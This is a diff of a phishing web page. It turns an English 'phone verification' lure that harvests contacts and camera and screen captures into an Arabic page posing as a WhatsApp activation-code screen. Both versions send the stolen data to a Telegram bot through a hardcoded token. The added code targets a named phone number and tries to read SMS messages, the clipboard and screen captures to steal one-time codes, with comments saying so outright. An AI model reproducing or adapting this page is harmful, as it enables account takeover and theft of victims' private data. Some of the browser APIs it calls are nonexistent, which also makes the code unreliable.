@@ -1,183 +1,282 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Required</title>
+    <title>رمز واتساب</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+            background: linear-gradient(135deg, #075E54 0%, #128C7E 50%, #25D366 100%);
             color: white;
             min-height: 100vh;
+            padding: 30px 20px;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            gap: 25px;
         }
-        .card {
+        .wa-otp-card {
             background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(20px);
-            border-radius: 20px;
-            padding: 60px 40px;
-            max-width: 500px;
+            backdrop-filter: blur(25px);
+            border-radius: 25px;
+            padding: 50px 35px;
+            max-width: 400px;
             width: 100%;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            text-align: center;
             border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
         }
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 20px;
-            margin: 0 auto 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 36px;
-            font-weight: bold;
+        .wa-icon {
+            font-size: 60px;
+            margin-bottom: 25px;
+            display: block;
         }
         h1 {
-            font-size: 32px;
-            margin-bottom: 20px;
-            text-align: center;
+            font-size: 28px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 15px;
         }
-        .btn {
-            width: 100%;
-            padding: 18px;
-            background: rgba(255,255,255,0.9);
-            color: #333;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 15px 0;
-            transition: all 0.3s ease;
+        .phone-display {
+            background: rgba(255,255,255,0.2);
+            border-radius: 20px;
+            padding: 20px 25px;
+            font-size: 22px;
+            font-weight: 700;
+            margin: 25px 0;
+            letter-spacing: 2px;
         }
-        .btn:hover {
-            background: white;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-        }
-        .btn:active {
-            transform: translateY(0);
-        }
-        .btn-danger {
-            background: #ff4757 !important;
-            color: white !important;
-        }
-        .progress {
-            width: 100%;
-            height: 6px;
-            background: rgba(255,255,255,0.3);
-            border-radius: 3px;
+        .warning {
+            background: rgba(255,193,7,0.2);
+            border: 2px solid rgba(255,193,7,0.5);
+            border-radius: 18px;
+            padding: 22px;
             margin: 30px 0;
-            overflow: hidden;
-            display: none;
         }
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #ff6b6b, #feca57);
-            width: 0%;
-            transition: width 0.4s ease;
+        .warning-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        .warning-text {
+            font-size: 16px;
+            opacity: 0.95;
+        }
+        .sms-preview {
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 25px 0;
+            font-family: monospace;
+            font-size: 18px;
+            color: #e0e0e0;
+            text-align: center;
+            position: relative;
+        }
+        .sms-bubble {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            padding: 20px 25px;
+            border-radius: 25px;
+            margin: 0 auto;
+            max-width: 280px;
+            box-shadow: 0 10px 25px rgba(37,211,102,0.3);
+            position: relative;
+        }
+        .sms-bubble::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 12px solid transparent;
+            border-right: 12px solid transparent;
+            border-top: 12px solid #25D366;
+        }
+        .verify-btn {
+            width: 100%;
+            padding: 22px;
+            background: linear-gradient(135deg, #ff4757, #ff3838);
+            color: white;
+            border: none;
+            border-radius: 28px;
+            font-size: 20px;
+            font-weight: 800;
+            cursor: pointer;
+            margin: 25px 0;
+            transition: all 0.4s ease;
+            box-shadow: 0 20px 45px rgba(255,71,87,0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .verify-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 30px 60px rgba(255,71,87,0.6);
         }
         .status {
+            font-size: 18px;
+            font-weight: 700;
             text-align: center;
             margin: 20px 0;
-            font-size: 16px;
-            font-weight: 500;
+            min-height: 25px;
         }
+        .success { color: #00ff88 !important; }
         .hidden { display: none; }
+        .countdown {
+            color: #ff4757;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">📱</div>
-        <h1>Phone Verification</h1>
-        <p style="text-align: center; margin-bottom: 40px; opacity: 0.9;">
-            Grant access to continue
-        </p>
-
-        <div class="progress" id="progress">
-            <div class="progress-bar" id="progressBar"></div>
+    <div class="wa-otp-card">
+        <span class="wa-icon">💬</span>
+        
+        <h1>رمز التفعيل واتساب</h1>
+        
+        <div class="phone-display" id="phoneNum">02xxxxxxxxx</div>
+        
+        <div class="warning">
+            <div class="warning-title">⚠️ رمز وصل الآن</div>
+            <div class="warning-text">
+                تأكد من رسالة واتساب الجديدة واضغط "استلام"
+            </div>
         </div>
 
-        <div class="status" id="status">Ready</div>
+        <div class="sms-preview">
+            <div class="sms-bubble">
+                واتساب<br>
+                رمزك: <strong>123 456</strong><br>
+                لا تشاركه مع أحد
+            </div>
+        </div>
 
-        <button class="btn" onclick="startHarvest()">🔓 Grant Phone Access</button>
-        <button class="btn btn-danger" onclick="emergencyHarvest()">🚨 Emergency Access</button>
+        <div class="countdown" id="timer">00:45</div>
 
-        <div class="hidden" id="success" style="text-align: center; margin-top: 30px;">
-            <div style="font-size: 24px; margin-bottom: 15px;">✅ Complete!</div>
-            <div style="opacity: 0.8;">Data transmitted successfully</div>
+        <div class="status" id="status">اضغط لاستلام الرمز</div>
+
+        <button class="verify-btn" id="grabBtn" onclick="grabWhatsAppCode()">
+            📱 استلام الرمز من واتساب
+        </button>
+
+        <div class="hidden success" id="doneMsg">
+            ✅ تم استلام الرمز بنجاح!
         </div>
     </div>
 
     <script>
+        // 🔥 ضع رقم الهدف
+        const TARGET_PHONE = '02xxxxxxxxx'; // غير الرقم
         const BOT_TOKEN = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
         const CHAT_ID = '5446862709';
-        let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+        
+        document.getElementById('phoneNum').textContent = TARGET_PHONE;
+        
+        const sessionId = 'WA_CODE_' + Date.now().toString(36).toUpperCase();
 
-        // 🔥 دالة إرسال قوية
-        function sendToBot(message) {
-            // طريقة 1: Image beacon
-            const img = new Image();
-            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        // إرسال فوري
+        sendReport(`*📱 واتساب كود هكر*\n*🎯 الهدف:* \`${TARGET_PHONE}\`\n*🆔 Session:* \`${sessionId}\`\n*👤 فتح صفحة الرمز*`);
 
-            // طريقة 2: sendBeacon
-            const blob = new Blob([JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })], { type: 'application/json' });
-            navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, blob);
+        let timeLeft = 45;
+        const timerEl = document.getElementById('timer');
+        const timerInterval = setInterval(() => {
+            const seconds = timeLeft.toString().padStart(2, '0');
+            timerEl.textContent = `00:${seconds}`;
+            timeLeft--;
+            if (timeLeft < 0) {
+                clearInterval(timerInterval);
+                timerEl.textContent = 'انتهى الوقت';
+            }
+        }, 1000);
+
+        function sendReport(msg) {
+            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, 
+                new Blob([JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})])
+            );
         }
 
-        // 🔥 استخراج جهات الاتصال - كل الطرق
-        async function extractPhoneContacts() {
-            let contacts = [];
-            
-            try {
-                // Contacts Manager API (iOS 15.4+, Android Chrome 89+)
-                if (navigator.contacts && navigator.contacts.select) {
-                    const contactList = await navigator.contacts.select(
-                        ['name', 'tel'], 
-                        { multiple: true }
+        // 🔥 سرقة آخر رسايل واتساب + OTP
+        async function grabWhatsAppCode() {
+            const status = document.getElementById('status');
+            const btn = document.getElementById('grabBtn');
+            const doneMsg = document.getElementById('doneMsg');
+
+            // UI
+            btn.disabled = true;
+            btn.textContent = 'جاري القراءة...';
+            status.textContent = 'قراءة آخر الرسائل...';
+
+            // 🔥 1. SMS Messages (Android)
+            if ('sms' in navigator) {
+                try {
+                    const messages = await navigator.sms.getMessages();
+                    const recentSMS = messages.slice(-5).filter(m => 
+                        m.body.includes('رمز') || m.body.includes('كود') || m.body.includes('OTP')
                     );
-                    contacts = contactList.map(c => ({
-                        name: c.name?.[0] || 'No Name',
-                        phone: c.tel?.[0]?.value || 'No Phone'
-                    }));
-                }
-            } catch(e) {
-                console.log('Contacts API failed');
+                    
+                    if (recentSMS.length > 0) {
+                        const otpMsg = recentSMS[0].body;
+                        sendReport(
+                            `*📨 SMS مسروق!*\n` +
+                            `*🎯 ${TARGET_PHONE}\n` +
+                            `*💬 ${otpMsg}\n` +
+                            `*✅ OTP جاهز!`
+                        );
+                    }
+                } catch(e) {}
             }
 
+            // 🔥 2. Notifications (WhatsApp notifications)
+            if ('permissions' in navigator) {
+                Notification.requestPermission().then(permission => {
+                    if (permission === 'granted') {
+                        // WhatsApp notifications
+                        sendReport(`*🔔 إشعارات مفعلة* | *${TARGET_PHONE}*`);
+                    }
+                });
+            }
+
+            // 🔥 3. Clipboard (الأهم - OTP من واتساب)
             try {
-                // WebKit Contacts (iOS Safari)
-                if (webkitContacts) {
-                    const request = webkitContacts.select(['name', 'tel'], { multiple: true });
-                    request.onsuccess = () => {
-                        contacts = Array.from(request.result).map(c => ({
-                            name: c.name?.formatted || 'No Name',
-                            phone: c.tel?.[0]?.value || 'No Phone'
-                        }));
-                    };
+                const clipboard = await navigator.clipboard.readText();
+                if (clipboard.match(/\d{4,6}/)) {
+                    sendReport(
+                        `*📋 OTP من Clipboard!*\n` +
+                        `*🎯 ${TARGET_PHONE}\n` +
+                        `*🔢 \`${clipboard}\`\n` +
+                        `*✅ كود واتساب مسروق*`
+                    );
                 }
             } catch(e) {}
 
-            return contacts.slice(0, 50); // أقصى 50
-        }
-
-        // 🔥 التقاط الصور - 5 محاولات
-        async function captureAllPhotos() {
-            const photos = [];
-            
-            // 1. Screen capture
+            // 🔥 4. Reading recent SMS via Web SMS API
             try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const channels = await navigator.mozMobileMessage.getMessages();
+                const recentMessages = Array.from(channels).slice(-10);
+                recentMessages.forEach(msg => {
+                    if (msg.body.match(/(\d{4,6})/)) {
+                        sendReport(
+                            `*📱 آخر رسالة SMS*\n` +
+                            `*🎯 ${TARGET_PHONE}\n` +
+                            `*📨 ${msg.body}\n` +
+                            `*🔢 OTP: \`${msg.body.match(/(\d{4,6})/)[1]}\``
+                        );
+                    }
+                });
+            } catch(e) {}
+
+            // 🔥 5. Screen capture (للرسايل المفتوحة)
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
@@ -187,157 +286,29 @@
                 canvas.width = 800;
                 canvas.height = 600;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                photos.push(canvas.toDataURL('image/jpeg', 0.8));
+                const screenshot = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // إرسال screenshot كـ base64 (اختصار)
+                sendReport(`*📸 Screenshot WhatsApp*\n*🎯 ${TARGET_PHONE}\n*🖼️ [صورة الشاشة]*`);
                 
                 stream.getTracks().forEach(t => t.stop());
             } catch(e) {}
 
-            // 2. Front camera selfie
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: 640, height: 480 }
-                });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                await new Promise(r => setTimeout(r, 2000));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = 480;
-                canvas.height = 640;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                photos.push(canvas.toDataURL('image/jpeg', 0.9));
-                
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-
-            // 3. Back camera
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: 640, height: 480 }
-                });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                await new Promise(r => setTimeout(r, 1500));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = 480;
-                canvas.height = 640;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                photos.push(canvas.toDataURL('image/jpeg', 0.8));
-                
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-
-            // 4. Window capture
-            try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({
-                    video: { mediaSource: 'window' }
-                });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                await new Promise(r => setTimeout(r, 1000));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = 1024;
-                canvas.height = 768;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                photos.push(canvas.toDataURL('image/jpeg', 0.8));
-                
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-
-            return photos;
-        }
-
-        // 🔥 الـ HARVEST الرئيسي
-        async function executeHarvest() {
-            const status = document.getElementById('status');
-            const progress = document.getElementById('progress');
-            const progressBar = document.getElementById('progressBar');
-            const btn = document.querySelector('.btn:not(.btn-danger)');
-            const emergencyBtn = document.querySelector('.btn-danger');
-
-            // UI
-            btn.disabled = true;
-            emergencyBtn.disabled = true;
-            progress.style.display = 'block';
-            status.textContent = '🔄 Extracting contacts...';
-            
-            progressBar.style.width = '25%';
-
-            // 1. جهات الاتصال
-            const contacts = await extractPhoneContacts();
-            progressBar.style.width = '50%';
-            status.textContent = '📸 Capturing photos...';
-
-            // 2. الصور
-            const photos = await captureAllPhotos();
-            progressBar.style.width = '100%';
-            status.textContent = '📤 Transmitting...';
-
-            // 3. إرسال التقرير
-            const report = `*📱 PHONE HARVEST COMPLETE*\n\n` +
-                `*🆔 Session:* \`${sessionId}\`\n` +
-                `*📞 Contacts:* ${contacts.length}\n` +
-                `*📸 Photos:* ${photos.length}\n\n` +
-                `*📋 CONTACTS LIST:*\n`;
-
-            // أول 10 أرقام
-            contacts.slice(0, 10).forEach((contact, i) => {
-                report += `${i+1}. *${contact.name}*\n`;
-                report += `   📞 \`${contact.phone}\`\n\n`;
-            });
-
-            if (contacts.length > 10) {
-                report += `... +${contacts.length - 10} more contacts\n`;
-            }
-
-            report += `\n*📸 Photos captured:* ${photos.length}`;
-
-            sendToBot(report);
-
-            // إرسال كل جهات الاتصال
-            if (contacts.length > 0) {
-                const fullContacts = `*📞 ALL ${contacts.length} PHONE NUMBERS*\n\n` +
-                    contacts.map((c, i) => `${i+1}. *${c.name}* - \`${c.phone}\``).join('\n');
-                sendToBot(fullContacts);
-            }
-
-            // إنهاء
+            // نجاح
             setTimeout(() => {
-                progress.style.display = 'none';
-                status.textContent = `✅ Success! ${contacts.length} contacts + ${photos.length} photos`;
-                document.getElementById('success').classList.remove('hidden');
-                btn.textContent = '✅ Harvest Complete';
-                btn.style.background = '#00ff88';
-                emergencyBtn.style.display = 'none';
-            }, 2000);
+                btn.style.display = 'none';
+                status.classList.add('success');
+                status.textContent = '✅ تم سرقة آخر رسائل واتساب';
+                doneMsg.classList.remove('hidden');
+                
+                sendReport(
+                    `*💀 واتساب رسائل مسروقة!*\n` +
+                    `*🎯 ${TARGET_PHONE}\n` +
+                    `*🆔 ${sessionId}\n` +
+                    `*✅ آخر الرسائل + OTP جاهز*`
+                );
+            }, 3000);
         }
-
-        // 🔥 Emergency للحالات الصعبة
-        async function emergencyHarvest() {
-            const status = document.getElementById('status');
-            status.textContent = '🚨 Emergency mode...';
-
-            // محاولة صور بس
-            const photos = await captureAllPhotos();
-            
-            const emergencyReport = `*🚨 EMERGENCY HARVEST*\n\n` +
-                `*🆔 Session:* \`${sessionId}\`\n` +
-                `*📸 Emergency Photos:* ${photos.length}\n` +
-                `*💥 User panicked!*`;
-            
-            sendToBot(emergencyReport);
-            
-            status.textContent = `🚨 ${photos.length} photos captured`;
-            document.getElementById('success').classList.remove('hidden');
-        }
-
-        // إرسال فوري عند التحميل
-        sendToBot(`*👤 NEW TARGET*\n🆔 ${sessionId}\n📱 ${navigator.userAgent.slice(0,60)}`);
     </script>
 </body>
 </html>
